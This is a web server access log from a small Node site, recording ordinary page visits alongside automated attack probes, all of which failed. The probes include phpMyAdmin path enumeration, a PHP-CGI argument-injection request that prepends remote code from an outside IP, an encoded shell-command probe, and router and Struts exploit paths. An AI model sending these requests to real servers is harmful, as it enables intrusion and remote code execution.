mexprinter is running on port : 3000
mexprinter is running on port : 3000
[0mGET / [36m304 [0m23.673 ms - -[0m
[0mGET /public/stylesheets/bootstrap.min.css.map [33m404 [0m6.272 ms - 4377[0m
[0mGET / [36m304 [0m8.049 ms - -[0m
[0mGET /public/stylesheets/bootstrap.min.css.map [33m404 [0m4.720 ms - 4377[0m
[0mGET /services [36m304 [0m17.720 ms - -[0m
[0mGET /public/images/services/3ddesign.jpg [33m404 [0m2.670 ms - 4377[0m
[0mGET /products [36m304 [0m17.106 ms - -[0m
[0mGET /public/images/products/zcube.jpg [33m404 [0m5.264 ms - 4377[0m
[0mGET /contact [36m304 [0m4.212 ms - -[0m
[0mGET /index [36m304 [0m4.631 ms - -[0m
[0mGET / [32m200 [0m2.324 ms - 10182[0m
[0mGET / [32m200 [0m3.783 ms - 10182[0m
[0mGET / [32m200 [0m5.815 ms - 10182[0m
[0mGET / [36m304 [0m2.958 ms - -[0m
[0mGET / [32m200 [0m3.060 ms - 10182[0m
[0mGET /courses [32m200 [0m7.225 ms - 13968[0m
[0mGET / [32m200 [0m2.347 ms - 10182[0m
[0mGET / [32m200 [0m2.318 ms - 10182[0m
[0mGET / [32m200 [0m3.630 ms - 10182[0m
[0mGET / [32m200 [0m3.992 ms - 10182[0m
[0mGET / [32m200 [0m3.287 ms - 10182[0m
[0mGET /services [32m200 [0m4.105 ms - 14452[0m
[0mGET /public/images/services/3ddesign.jpg [33m404 [0m2.124 ms - 4377[0m
[0mGET /contact [32m200 [0m2.953 ms - 8629[0m
[0mPOST /contact/send/mail [32m200 [0m1643.787 ms - -[0m
[0mGET /contact [32m200 [0m2.379 ms - 8629[0m
[0mGET /contact [32m200 [0m2.125 ms - 8629[0m
[0mGET /contact [32m200 [0m2.904 ms - 8629[0m
[0mGET /contact [32m200 [0m3.329 ms - 8629[0m
[0mPOST /contact/send/mail [32m200 [0m1556.653 ms - -[0m
[0mGET / [32m200 [0m2.843 ms - 10182[0m
[0mGET /contact [32m200 [0m3.033 ms - 8629[0m
[0mGET / [32m200 [0m2.835 ms - 10182[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=149188971945&a=PSCMN&i=584106215&p=80 [33m404 [0m2.751 ms - 4377[0m
[0mGET / [32m200 [0m5.637 ms - 10182[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=149190488591&a=PSCMN&i=584106215&p=80 [33m404 [0m2.264 ms - 4377[0m
[0mGET /map_ports.html [33m404 [0m2.412 ms - 4377[0m
[0mGET /map_ports.html [33m404 [0m1.807 ms - 4377[0m
[0mGET / [32m200 [0m2.470 ms - 10182[0m
[0mGET /map_ports.html [33m404 [0m2.156 ms - 4377[0m
[0mGET / [32m200 [0m2.744 ms - 10182[0m
[0mGET /map_ports.html [33m404 [0m2.455 ms - 4377[0m
[0mGET / [32m200 [0m2.641 ms - 10182[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=149191925911&a=PSCMN&i=584106215&p=80 [33m404 [0m1.851 ms - 4377[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m2.448 ms - 4377[0m
[0mGET http://clientapi.ipip.net/echo.php?info=20170412044447 [33m404 [0m8.131 ms - 4377[0m
[0mGET /cgi/common.cgi [33m404 [0m2.756 ms - 4377[0m
[0mGET /stssys.htm [33m404 [0m2.387 ms - 4377[0m
[0mGET / [32m200 [0m3.050 ms - 10182[0m
[0mPOST /command.php [33m404 [0m2.351 ms - 4377[0m
[0mGET / [32m200 [0m4.730 ms - 10182[0m
[0mGET / [32m200 [0m2.767 ms - 10182[0m
[0mGET / [32m200 [0m3.384 ms - 10182[0m
[0mGET / [32m200 [0m3.109 ms - 10182[0m
[0mHEAD http://180.163.113.82/check_proxy [33m404 [0m2.900 ms - 4377[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=149202611601&a=PSCMN&i=584106215&p=80 [33m404 [0m1.928 ms - 4377[0m
[0mGET /muieblackcat [33m404 [0m2.112 ms - 4377[0m
[0mGET //phpmyadmin/scripts/setup.php [33m404 [0m2.608 ms - 4377[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=149204095731&a=PSCMN&i=584106215&p=80 [33m404 [0m3.721 ms - 4377[0m
[0mGET / [32m200 [0m2.925 ms - 10182[0m
[0mGET /muieblackcat [33m404 [0m2.488 ms - 4377[0m
[0mGET //phpmyadmin/scripts/setup.php [33m404 [0m2.723 ms - 4377[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=149205632941&a=PSCMN&i=584106215&p=80 [33m404 [0m3.388 ms - 4377[0m
[0mGET / [32m200 [0m2.978 ms - 10182[0m
[0mGET / [32m200 [0m2.802 ms - 10182[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=149207154639&a=PSCMN&i=584106215&p=80 [33m404 [0m2.515 ms - 4377[0m
[0mGET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n [33m404 [0m1.768 ms - 4377[0m
[0mGET / [32m200 [0m8.258 ms - 10182[0m
[0mGET / [32m200 [0m3.703 ms - 10182[0m
[0mGET / [32m200 [0m2.255 ms - 10182[0m
[0mGET / [32m200 [0m2.800 ms - 10182[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=149208602937&a=PSCMN&i=584106215&p=80 [33m404 [0m1.830 ms - 4377[0m
[0mPOST / [33m404 [0m2.231 ms - 4377[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=149210140993&a=PSCMN&i=584106215&p=80 [33m404 [0m3.554 ms - 4377[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m3.460 ms - 4377[0m
[0mGET / [32m200 [0m2.243 ms - 10182[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=149211675447&a=PSCMN&i=584106215&p=80 [33m404 [0m4.272 ms - 4377[0m
[0mGET / [32m200 [0m2.266 ms - 10182[0m
[0mGET / [32m200 [0m2.777 ms - 10182[0m
[0mGET / [32m200 [0m2.801 ms - 10182[0m
[0mHEAD / [32m200 [0m2.226 ms - 10182[0m
[0mGET / [32m200 [0m2.779 ms - 10182[0m
[0mGET / [32m200 [0m2.739 ms - 10182[0m
[0mGET /map_ports.html [33m404 [0m2.120 ms - 4377[0m
[0mGET / [32m200 [0m4.995 ms - 10182[0m
[0mGET / [32m200 [0m6.664 ms - 10182[0m
[0mGET /hndUnblock.cgi [33m404 [0m2.356 ms - 4377[0m
[0mGET /tmUnblock.cgi [33m404 [0m1.727 ms - 4377[0m
[0mGET / [32m200 [0m3.066 ms - 10182[0m
[0mGET / [32m200 [0m3.734 ms - 10182[0m
[0mGET / [36m304 [0m2.281 ms - -[0m
[0mGET /courses [32m200 [0m4.014 ms - 13968[0m
[0mGET /contact [36m304 [0m2.871 ms - -[0m
[0mGET /muieblackcat [33m404 [0m1.770 ms - 4377[0m
[0mGET //phpMyAdmin/scripts/setup.php [33m404 [0m2.382 ms - 4377[0m
[0mGET //phpmyadmin/scripts/setup.php [33m404 [0m4.116 ms - 4377[0m
[0mGET //pma/scripts/setup.php [33m404 [0m1.722 ms - 4377[0m
[0mGET //myadmin/scripts/setup.php [33m404 [0m2.186 ms - 4377[0m
[0mGET //MyAdmin/scripts/setup.php [33m404 [0m1.692 ms - 4377[0m
[0mGET / [32m200 [0m3.000 ms - 10182[0m
[0mGET / [32m200 [0m2.845 ms - 10182[0m
[0mGET /current_config/Account1 [33m404 [0m1.672 ms - 4377[0m
[0mGET / [32m200 [0m2.684 ms - 10182[0m
[0mGET /manager/html [33m404 [0m1.717 ms - 4377[0m
[0mGET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n [33m404 [0m3.252 ms - 4377[0m
[0mGET / [32m200 [0m3.237 ms - 10182[0m
[0mGET /manager/html [33m404 [0m1.701 ms - 4377[0m
[0mGET / [32m200 [0m2.647 ms - 10182[0m
[0mGET / [32m200 [0m2.674 ms - 10182[0m
[0mGET / [32m200 [0m2.225 ms - 10182[0m
[0mGET / [32m200 [0m2.778 ms - 10182[0m
[0mGET / [36m304 [0m2.814 ms - -[0m
[0mGET / [32m200 [0m2.892 ms - 10182[0m
[0mGET / [32m200 [0m2.233 ms - 10182[0m
[0mGET / [32m200 [0m2.768 ms - 10182[0m
[0mGET http://clientapi.ipip.net/echo.php?info=20170416144748 [33m404 [0m1.845 ms - 4377[0m
[0mGET / [32m200 [0m2.717 ms - 10182[0m
[0mGET /phpmyadmin [33m404 [0m1.723 ms - 4377[0m
[0mGET / [32m200 [0m2.840 ms - 10182[0m
[0mGET /x [33m404 [0m2.055 ms - 4377[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m2.112 ms - 4377[0m
[0mGET / [32m200 [0m2.244 ms - 10182[0m
[0mGET /muieblackcat [33m404 [0m5.050 ms - 4377[0m
[0mGET //phpmyadmin/scripts/setup.php [33m404 [0m1.717 ms - 4377[0m
[0mGET / [32m200 [0m3.128 ms - 10182[0m
[0mGET / [32m200 [0m2.708 ms - 10182[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=149240896571&a=PSCMN&i=584106215&p=80 [33m404 [0m1.832 ms - 4377[0m
[0mGET / [32m200 [0m7.473 ms - 10182[0m
[0mGET / [32m200 [0m2.336 ms - 10182[0m
[0mGET / [32m200 [0m4.203 ms - 10182[0m
[0mPOST / [33m404 [0m2.423 ms - 4377[0m
[0mPOST /index.action [33m404 [0m6.760 ms - 4377[0m
[0mPOST /login.action [33m404 [0m2.308 ms - 4377[0m
[0mPOST / [33m404 [0m14.594 ms - 4377[0m
[0mPOST /index.action [33m404 [0m1.769 ms - 4377[0m
[0mPOST /login.action [33m404 [0m1.851 ms - 4377[0m
[0mGET / [32m200 [0m2.847 ms - 10182[0m
[0mGET /robots.txt [33m404 [0m6.720 ms - 4377[0m
[0mGET /sitemap.xml [33m404 [0m4.730 ms - 4377[0m
[0mGET / [32m200 [0m2.321 ms - 10182[0m
[0mGET /default/en_US/status.html [33m404 [0m2.229 ms - 4377[0m
[0mGET http://proxyjudge.info/ [32m200 [0m2.241 ms - 10182[0m
[0mGET /default/en_US/status.html [33m404 [0m2.229 ms - 4377[0m
[0mPROPFIND / [33m404 [0m2.168 ms - 4377[0m
[0mGET / [32m200 [0m4.428 ms - 10182[0m
[0mGET / [32m200 [0m2.740 ms - 10182[0m
[0mGET / [32m200 [0m2.171 ms - 10182[0m
[0mGET /robots.txt [33m404 [0m2.153 ms - 4377[0m
[0mGET /sitemap.xml [33m404 [0m1.695 ms - 4377[0m
[0mGET /xmlrpc.php [33m404 [0m1.958 ms - 4377[0m
[0mGET / [32m200 [0m2.697 ms - 10182[0m
[0mGET / [32m200 [0m2.700 ms - 10182[0m
[0mGET / [32m200 [0m2.199 ms - 10182[0m
[0mGET / [32m200 [0m2.814 ms - 10182[0m
[0mGET /w00tw00t.at.ISC.SANS.DFind:) [33m404 [0m1.696 ms - 4377[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m2.548 ms - 4377[0m
[0mGET / [32m200 [0m2.238 ms - 10182[0m
[0mGET / [32m200 [0m2.726 ms - 10182[0m
[0mGET / [32m200 [0m4.211 ms - 10182[0m
[0mGET /cgi/common.cgi [33m404 [0m1.606 ms - 4377[0m
[0mGET /stssys.htm [33m404 [0m1.665 ms - 4377[0m
[0mGET / [32m200 [0m2.773 ms - 10182[0m
[0mPOST /command.php [33m404 [0m1.722 ms - 4377[0m
[0mGET / [32m200 [0m2.732 ms - 10182[0m
[0mGET / [32m200 [0m2.814 ms - 10182[0m
[0mGET / [32m200 [0m2.252 ms - 10182[0m
[0mGET / [32m200 [0m2.799 ms - 10182[0m
[0mGET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n [33m404 [0m1.649 ms - 4377[0m
[0mGET /CFIDE/administrator/ [33m404 [0m6.736 ms - 4377[0m
[0mHEAD / [32m200 [0m2.255 ms - 10182[0m
[0mGET http://httpheader.net/ [32m200 [0m2.787 ms - 10182[0m
[0mHEAD http://180.163.113.82/check_proxy [33m404 [0m1.712 ms - 4377[0m
[0mHEAD http://180.163.113.82/check_proxy [33m404 [0m2.273 ms - 4377[0m
[0mGET / [32m200 [0m2.200 ms - 10182[0m
[0mGET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n [33m404 [0m2.159 ms - 4377[0m
[0mGET / [32m200 [0m2.247 ms - 10182[0m
[0mGET /courses [32m200 [0m22.062 ms - 13968[0m
[0mGET /services [32m200 [0m8.332 ms - 14452[0m
[0mGET /public/images/services/3ddesign.jpg [33m404 [0m3.874 ms - 4377[0m
[0mGET /products [32m200 [0m19.889 ms - 7515[0m
[0mGET /public/images/products/zcube.jpg [33m404 [0m4.684 ms - 4377[0m
[0mGET /contact [32m200 [0m20.559 ms - 8629[0m
[0mGET / [32m200 [0m7.706 ms - 10182[0m
[0mGET / [32m200 [0m5.436 ms - 10182[0m
[0mGET / [32m200 [0m4.388 ms - 10182[0m
[0mGET /mainAction.action [33m404 [0m3.233 ms - 4377[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m2.998 ms - 4377[0m
[0mGET /hndUnblock.cgi [33m404 [0m2.572 ms - 4377[0m
[0mGET /tmUnblock.cgi [33m404 [0m2.738 ms - 4377[0m
[0mGET / [32m200 [0m5.815 ms - 10182[0m
[0mGET / [32m200 [0m3.497 ms - 10182[0m
[0mGET / [32m200 [0m3.522 ms - 10182[0m
[0mGET /robots.txt [33m404 [0m2.516 ms - 4377[0m
[0mGET /sitemap.xml [33m404 [0m2.104 ms - 4377[0m
[0mGET / [32m200 [0m4.793 ms - 10182[0m
[0mGET / [32m200 [0m8.850 ms - 10182[0m
[0mGET / [32m200 [0m12.050 ms - 10182[0m
[0mGET / [32m200 [0m3.472 ms - 10182[0m
[0mGET / [32m200 [0m6.431 ms - 10182[0m
[0mGET / [32m200 [0m9.297 ms - 10182[0m
[0mGET / [32m200 [0m3.934 ms - 10182[0m
[0mGET /manager/html [33m404 [0m2.094 ms - 4377[0m
[0mGET /manager/html [33m404 [0m2.536 ms - 4377[0m
[0mGET / [32m200 [0m3.159 ms - 10182[0m
[0mGET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n [33m404 [0m2.541 ms - 4377[0m
[0mGET / [32m200 [0m3.130 ms - 10182[0m
[0mGET / [32m200 [0m3.538 ms - 10182[0m
[0mGET / [32m200 [0m3.269 ms - 10182[0m
[0mGET /CFIDE/administrator/ [33m404 [0m2.228 ms - 4377[0m
[0mGET / [32m200 [0m8.529 ms - 10182[0m
[0mGET / [32m200 [0m3.700 ms - 10182[0m
[0mGET / [32m200 [0m5.589 ms - 10182[0m
[0mGET / [32m200 [0m3.870 ms - 10182[0m
[0mGET / [32m200 [0m4.410 ms - 10182[0m
[0mGET / [32m200 [0m4.098 ms - 10182[0m
[0mGET /courses [32m200 [0m4.576 ms - 13968[0m
[0mGET /services [32m200 [0m5.110 ms - 14452[0m
[0mGET /public/images/services/3ddesign.jpg [33m404 [0m2.996 ms - 4377[0m
[0mGET /products [32m200 [0m5.848 ms - 7515[0m
[0mGET /public/images/products/zcube.jpg [33m404 [0m2.689 ms - 4377[0m
[0mGET /contact [32m200 [0m4.888 ms - 8629[0m
[0mGET /index [32m200 [0m5.626 ms - 10182[0m
[0mGET /products [36m304 [0m4.087 ms - -[0m
[0mGET /public/images/products/zcube.jpg [33m404 [0m2.734 ms - 4377[0m
[0mGET /contact [36m304 [0m2.828 ms - -[0m
[0mHEAD /phpmyadmin/index.php [33m404 [0m2.622 ms - 4377[0m
[0mGET / [32m200 [0m5.507 ms - 10182[0m
[0mGET / [32m200 [0m3.696 ms - 10182[0m
[0mGET /muieblackcat [33m404 [0m2.036 ms - 4377[0m
[0mGET //admin/scripts/setup.php [33m404 [0m2.464 ms - 4377[0m
[0mGET //scripts/setup.php [33m404 [0m2.043 ms - 4377[0m
[0mGET //admin/pma/scripts/setup.php [33m404 [0m2.644 ms - 4377[0m
[0mGET //admin/phpmyadmin/scripts/setup.php [33m404 [0m2.122 ms - 4377[0m
[0mGET //db/scripts/setup.php [33m404 [0m2.090 ms - 4377[0m
[0mGET //dbadmin/scripts/setup.php [33m404 [0m2.621 ms - 4377[0m
[0mGET //myadmin/scripts/setup.php [33m404 [0m2.694 ms - 4377[0m
[0mGET //mysql/scripts/setup.php [33m404 [0m2.069 ms - 4377[0m
[0mGET //mysqladmin/scripts/setup.php [33m404 [0m2.576 ms - 4377[0m
[0mGET //typo3/phpmyadmin/scripts/setup.php [33m404 [0m2.044 ms - 4377[0m
[0mGET //phpadmin/scripts/setup.php [33m404 [0m2.578 ms - 4377[0m
[0mGET //phpMyAdmin/scripts/setup.php [33m404 [0m2.114 ms - 4377[0m
[0mGET //phpmyadmin1/scripts/setup.php [33m404 [0m3.761 ms - 4377[0m
[0mGET //phpmyadmin2/scripts/setup.php [33m404 [0m5.976 ms - 4377[0m
[0mGET //pma/scripts/setup.php [33m404 [0m2.056 ms - 4377[0m
[0mGET //web/phpMyAdmin/scripts/setup.php [33m404 [0m3.179 ms - 4377[0m
[0mGET //xampp/phpmyadmin/scripts/setup.php [33m404 [0m3.014 ms - 4377[0m
[0mGET //web/scripts/setup.php [33m404 [0m2.064 ms - 4377[0m
[0mGET //php-my-admin/scripts/setup.php [33m404 [0m4.199 ms - 4377[0m
[0mGET //websql/scripts/setup.php [33m404 [0m4.615 ms - 4377[0m
[0mGET //phpMyAdmin-2/scripts/setup.php [33m404 [0m2.048 ms - 4377[0m
[0mGET //phpMyAdmin-2.2.3/scripts/setup.php [33m404 [0m2.687 ms - 4377[0m
[0mGET //phpMyAdmin-2.2.6/scripts/setup.php [33m404 [0m6.563 ms - 4377[0m
[0mGET //phpMyAdmin-2.5.1/scripts/setup.php [33m404 [0m2.004 ms - 4377[0m
[0mGET //phpMyAdmin-2.5.4/scripts/setup.php [33m404 [0m2.499 ms - 4377[0m
[0mGET //phpMyAdmin-2.5.5-rc1/scripts/setup.php [33m404 [0m1.993 ms - 4377[0m
[0mGET //phpMyAdmin-2.5.5-rc2/scripts/setup.php [33m404 [0m2.511 ms - 4377[0m
[0mGET //phpMyAdmin-2.5.5/scripts/setup.php [33m404 [0m2.034 ms - 4377[0m
[0mGET //phpMyAdmin-2.5.5-pl1/scripts/setup.php [33m404 [0m2.009 ms - 4377[0m
[0mGET //phpMyAdmin-2.5.6-rc1/scripts/setup.php [33m404 [0m2.692 ms - 4377[0m
[0mGET //phpMyAdmin-2.5.6-rc2/scripts/setup.php [33m404 [0m5.088 ms - 4377[0m
[0mGET //phpMyAdmin-2.5.6/scripts/setup.php [33m404 [0m2.039 ms - 4377[0m
[0mGET //phpMyAdmin-2.5.7/scripts/setup.php [33m404 [0m3.287 ms - 4377[0m
[0mGET //phpMyAdmin-2.5.7-pl1/scripts/setup.php [33m404 [0m2.346 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.0-alpha/scripts/setup.php [33m404 [0m2.861 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.0-alpha2/scripts/setup.php [33m404 [0m2.424 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.0-beta1/scripts/setup.php [33m404 [0m3.201 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.0-beta2/scripts/setup.php [33m404 [0m3.102 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.0-rc1/scripts/setup.php [33m404 [0m3.695 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.0-rc2/scripts/setup.php [33m404 [0m2.077 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.0-rc3/scripts/setup.php [33m404 [0m2.543 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.0/scripts/setup.php [33m404 [0m2.093 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.0-pl1/scripts/setup.php [33m404 [0m2.507 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.0-pl2/scripts/setup.php [33m404 [0m2.028 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.0-pl3/scripts/setup.php [33m404 [0m2.023 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.1-rc1/scripts/setup.php [33m404 [0m2.681 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.1-rc2/scripts/setup.php [33m404 [0m2.039 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.1/scripts/setup.php [33m404 [0m2.880 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.1-pl1/scripts/setup.php [33m404 [0m2.535 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.1-pl2/scripts/setup.php [33m404 [0m3.425 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.1-pl3/scripts/setup.php [33m404 [0m2.470 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.2-rc1/scripts/setup.php [33m404 [0m1.972 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.2-beta1/scripts/setup.php [33m404 [0m3.433 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.2/scripts/setup.php [33m404 [0m2.708 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.2-pl1/scripts/setup.php [33m404 [0m2.077 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.3/scripts/setup.php [33m404 [0m2.028 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.3-rc1/scripts/setup.php [33m404 [0m2.521 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.3-pl1/scripts/setup.php [33m404 [0m1.974 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.4-rc1/scripts/setup.php [33m404 [0m1.991 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.4-pl1/scripts/setup.php [33m404 [0m2.015 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.4-pl2/scripts/setup.php [33m404 [0m4.431 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.4-pl3/scripts/setup.php [33m404 [0m2.717 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.4-pl4/scripts/setup.php [33m404 [0m2.015 ms - 4377[0m
[0mGET //phpMyAdmin-2.6.4/scripts/setup.php [33m404 [0m8.999 ms - 4377[0m
[0mGET //phpMyAdmin-2.7.0-beta1/scripts/setup.php [33m404 [0m2.549 ms - 4377[0m
[0mGET //phpMyAdmin-2.7.0-rc1/scripts/setup.php [33m404 [0m1.990 ms - 4377[0m
[0mGET //phpMyAdmin-2.7.0-pl1/scripts/setup.php [33m404 [0m2.529 ms - 4377[0m
[0mGET //phpMyAdmin-2.7.0-pl2/scripts/setup.php [33m404 [0m2.020 ms - 4377[0m
[0mGET //phpMyAdmin-2.7.0/scripts/setup.php [33m404 [0m2.016 ms - 4377[0m
[0mGET //phpMyAdmin-2.8.0-beta1/scripts/setup.php [33m404 [0m2.662 ms - 4377[0m
[0mGET //phpMyAdmin-2.8.0-rc1/scripts/setup.php [33m404 [0m2.461 ms - 4377[0m
[0mGET //phpMyAdmin-2.8.0-rc2/scripts/setup.php [33m404 [0m2.038 ms - 4377[0m
[0mGET //phpMyAdmin-2.8.0/scripts/setup.php [33m404 [0m2.580 ms - 4377[0m
[0mGET //phpMyAdmin-2.8.0.1/scripts/setup.php [33m404 [0m2.497 ms - 4377[0m
[0mGET //phpMyAdmin-2.8.0.2/scripts/setup.php [33m404 [0m2.020 ms - 4377[0m
[0mGET //phpMyAdmin-2.8.0.3/scripts/setup.php [33m404 [0m2.010 ms - 4377[0m
[0mGET //phpMyAdmin-2.8.0.4/scripts/setup.php [33m404 [0m2.460 ms - 4377[0m
[0mGET //phpMyAdmin-2.8.1-rc1/scripts/setup.php [33m404 [0m2.750 ms - 4377[0m
[0mGET //phpMyAdmin-2.8.1/scripts/setup.php [33m404 [0m8.805 ms - 4377[0m
[0mGET //phpMyAdmin-2.8.2/scripts/setup.php [33m404 [0m4.455 ms - 4377[0m
[0mGET //sqlmanager/scripts/setup.php [33m404 [0m2.543 ms - 4377[0m
[0mGET //mysqlmanager/scripts/setup.php [33m404 [0m2.491 ms - 4377[0m
[0mGET //p/m/a/scripts/setup.php [33m404 [0m3.006 ms - 4377[0m
[0mGET //PMA2005/scripts/setup.php [33m404 [0m2.063 ms - 4377[0m
[0mGET //phpmanager/scripts/setup.php [33m404 [0m2.123 ms - 4377[0m
[0mGET //php-myadmin/scripts/setup.php [33m404 [0m3.102 ms - 4377[0m
[0mGET //phpmy-admin/scripts/setup.php [33m404 [0m1.975 ms - 4377[0m
[0mGET //webadmin/scripts/setup.php [33m404 [0m1.980 ms - 4377[0m
[0mGET //sqlweb/scripts/setup.php [33m404 [0m3.101 ms - 4377[0m
[0mGET //webdb/scripts/setup.php [33m404 [0m2.052 ms - 4377[0m
[0mGET //mysql-admin/scripts/setup.php [33m404 [0m2.058 ms - 4377[0m
[0mGET / [32m200 [0m3.460 ms - 10182[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m2.067 ms - 4377[0m
[0mGET / [32m200 [0m4.083 ms - 10182[0m
[0mGET / [32m200 [0m3.963 ms - 10182[0m
[0mGET / [36m304 [0m4.058 ms - -[0m
[0mGET / [32m200 [0m4.205 ms - 10182[0m
[0mGET / [32m200 [0m3.183 ms - 10182[0m
[0mGET / [32m200 [0m4.833 ms - 10182[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m2.041 ms - 4377[0m
[0mGET / [32m200 [0m8.823 ms - 10182[0m
[0mGET / [32m200 [0m3.589 ms - 10182[0m
[0mGET /Http/DataLayCfg.xml [33m404 [0m1.999 ms - 4377[0m
[0mGET /www/start.html [33m404 [0m1.988 ms - 4377[0m
[0mGET /RemoteControl.html [33m404 [0m7.160 ms - 4377[0m
[0mGET /invoker/JMXInvokerServlet [33m404 [0m2.617 ms - 4377[0m
[0mGET /stats [33m404 [0m3.602 ms - 4377[0m
[0mGET /jenkins [33m404 [0m2.030 ms - 4377[0m
[0mGET /robots.txt [33m404 [0m2.014 ms - 4377[0m
[0mGET /index.html [33m404 [0m2.855 ms - 4377[0m
[0mGET /index.html [33m404 [0m1.998 ms - 4377[0m
[0mGET / [32m200 [0m3.591 ms - 10182[0m
[0mGET /courses [32m200 [0m4.849 ms - 13968[0m
[0mGET /services [32m200 [0m4.751 ms - 14452[0m
[0mGET /public/images/services/3ddesign.jpg [33m404 [0m2.899 ms - 4377[0m
[0mGET / [32m200 [0m3.080 ms - 10182[0m
[0mGET / [32m200 [0m3.439 ms - 10182[0m
[0mGET / [36m304 [0m3.227 ms - -[0m
[0mGET /services [36m304 [0m4.637 ms - -[0m
[0mGET /public/images/services/3ddesign.jpg [33m404 [0m2.156 ms - 4377[0m
[0mGET / [32m200 [0m3.271 ms - 10182[0m
[0mGET / [32m200 [0m3.105 ms - 10182[0m
[0mGET / [32m200 [0m9.260 ms - 10182[0m
[0mGET /x [33m404 [0m2.003 ms - 4377[0m
[0mGET / [32m200 [0m3.634 ms - 10182[0m
[0mGET / [32m200 [0m3.821 ms - 10182[0m
[0mGET / [32m200 [0m3.145 ms - 10182[0m
[0mGET / [32m200 [0m3.770 ms - 10182[0m
[0mGET / [32m200 [0m3.702 ms - 10182[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m2.376 ms - 4377[0m
[0mGET /robots.txt [33m404 [0m2.286 ms - 4377[0m
[0mGET /index.html [33m404 [0m2.702 ms - 4377[0m
[0mGET /index.html [33m404 [0m1.999 ms - 4377[0m
[0mGET /recordings/index.php [33m404 [0m1.969 ms - 4377[0m
[0mGET /recordings/index.php [33m404 [0m2.033 ms - 4377[0m
[0mGET / [32m200 [0m3.089 ms - 10182[0m
[0mGET /shell?%75%6E%61%6D%65%20%2D%61 [33m404 [0m3.168 ms - 4377[0m
[0mGET / [32m200 [0m3.383 ms - 10182[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m2.523 ms - 4377[0m
[0mGET / [32m200 [0m3.122 ms - 10182[0m
[0mGET / [32m200 [0m3.521 ms - 10182[0m
[0mGET / [32m200 [0m3.618 ms - 10182[0m
[0mPOST / [33m404 [0m2.489 ms - 4377[0m
[0mGET / [32m200 [0m3.692 ms - 10182[0m
[0mGET /courses [32m200 [0m5.047 ms - 13968[0m
[0mGET /courses [36m304 [0m8.676 ms - -[0m
[0mGET /services [36m304 [0m5.226 ms - -[0m
[0mGET /public/images/services/3ddesign.jpg [33m404 [0m2.055 ms - 4377[0m
[0mGET /products [32m200 [0m3.418 ms - 7515[0m
[0mGET /public/images/products/zcube.jpg [33m404 [0m2.037 ms - 4377[0m
